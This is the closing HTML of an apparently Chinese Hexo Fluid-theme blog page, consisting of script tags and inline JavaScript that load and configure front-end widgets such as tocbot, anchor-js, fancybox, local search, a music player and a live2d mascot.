      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/caidai.js"></script>
<script src="//paste.vaala.cloud/raw/siqopubiwi.js"></script>
<script src="/js/APlayer.min.js"></script>
<script src="//url.wuuconix.link/live2d.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
